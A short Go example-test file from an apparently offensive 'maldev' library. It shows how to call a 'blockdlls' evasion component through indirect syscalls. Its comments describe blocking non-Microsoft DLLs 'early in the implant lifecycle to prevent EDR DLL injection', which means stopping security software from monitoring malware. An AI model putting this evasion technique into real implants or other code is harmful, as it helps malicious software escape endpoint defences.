//go:build windows

package blockdlls_test

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/blockdlls"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Enable refuses subsequent loads of any DLL not signed by Microsoft.
// Useful early in the implant lifecycle to prevent EDR DLL injection.
func ExampleEnable() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	if err := blockdlls.Enable(caller); err != nil {
		fmt.Println("blockdlls:", err)
	}
}

// MicrosoftOnly returns the Technique adapter for evasion.ApplyAll.
func ExampleMicrosoftOnly() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	_ = evasion.ApplyAll([]evasion.Technique{
		blockdlls.MicrosoftOnly(),
	}, caller)
}
